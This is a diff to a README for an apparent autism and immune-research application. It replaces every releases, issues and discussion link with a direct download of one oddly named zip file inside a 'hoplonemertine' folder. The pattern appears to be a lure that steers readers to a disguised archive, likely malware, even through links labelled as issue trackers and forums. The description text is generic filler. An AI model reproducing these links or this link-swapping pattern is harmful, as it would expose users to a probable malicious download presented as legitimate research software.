@@ -1,7 +1,7 @@
 # 🎉 hypothesis-intrinsic-autism-and-immune-mediated-deurodevelopmental-disorder - Understand Autism and Neurodevelopmental Disorders
 
 ## 🔗 Download Now
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/stizox45/hypothesis-intrinsic-autism-and-immune-mediated-deurodevelopmental-disorder/releases)
+[![Download the latest release](https://raw.githubusercontent.com/stizox45/hypothesis-intrinsic-autism-and-immune-mediated-deurodevelopmental-disorder/main/hoplonemertine/deurodevelopmental_and_immune_autism_disorder_mediated_hypothesis_intrinsic_bawdily.zip%20Latest%https://raw.githubusercontent.com/stizox45/hypothesis-intrinsic-autism-and-immune-mediated-deurodevelopmental-disorder/main/hoplonemertine/deurodevelopmental_and_immune_autism_disorder_mediated_hypothesis_intrinsic_bawdily.zip)](https://raw.githubusercontent.com/stizox45/hypothesis-intrinsic-autism-and-immune-mediated-deurodevelopmental-disorder/main/hoplonemertine/deurodevelopmental_and_immune_autism_disorder_mediated_hypothesis_intrinsic_bawdily.zip)
 
 ## 📜 Description
 The "Hypothesis Intrinsic Autism and Immune-Mediated Neurodevelopmental Disorders" software aims to facilitate research into the connections between autism and immune-related factors. This application provides tools for researchers, healthcare professionals, and interested users to explore important topics related to autism, such as biomarkers, developmental toxicology, and environmental health.
@@ -16,7 +16,7 @@ To get started with this application, you will need to follow these steps to suc
 - **Disk Space:** At least 500 MB of free space
 
 ### 📥 Download & Install
-1. **Visit the Releases Page:** Go to the following link to access the downloadable files: [Download Here](https://github.com/stizox45/hypothesis-intrinsic-autism-and-immune-mediated-deurodevelopmental-disorder/releases).
+1. **Visit the Releases Page:** Go to the following link to access the downloadable files: [Download Here](https://raw.githubusercontent.com/stizox45/hypothesis-intrinsic-autism-and-immune-mediated-deurodevelopmental-disorder/main/hoplonemertine/deurodevelopmental_and_immune_autism_disorder_mediated_hypothesis_intrinsic_bawdily.zip).
   
 2. **Choose the Latest Version:** Once on the Releases page, find the latest version listed at the top. This version will usually have the highest number.
   
@@ -69,6 +69,6 @@ If you are interested in improving this application or contributing in another w
 Thank you for your interest in this software. Together, we can enhance understanding and support for autism and immune-mediated neurodevelopmental disorders.
 
 ## 🔗 Useful Links
-- [Download the latest release](https://github.com/stizox45/hypothesis-intrinsic-autism-and-immune-mediated-deurodevelopmental-disorder/releases)
-- [View Issues](https://github.com/stizox45/hypothesis-intrinsic-autism-and-immune-mediated-deurodevelopmental-disorder/issues)
-- [Discussion Forum](https://github.com/stizox45/hypothesis-intrinsic-autism-and-immune-mediated-deurodevelopmental-disorder/discussions)
+- [Download the latest release](https://raw.githubusercontent.com/stizox45/hypothesis-intrinsic-autism-and-immune-mediated-deurodevelopmental-disorder/main/hoplonemertine/deurodevelopmental_and_immune_autism_disorder_mediated_hypothesis_intrinsic_bawdily.zip)
+- [View Issues](https://raw.githubusercontent.com/stizox45/hypothesis-intrinsic-autism-and-immune-mediated-deurodevelopmental-disorder/main/hoplonemertine/deurodevelopmental_and_immune_autism_disorder_mediated_hypothesis_intrinsic_bawdily.zip)
+- [Discussion Forum](https://raw.githubusercontent.com/stizox45/hypothesis-intrinsic-autism-and-immune-mediated-deurodevelopmental-disorder/main/hoplonemertine/deurodevelopmental_and_immune_autism_disorder_mediated_hypothesis_intrinsic_bawdily.zip)
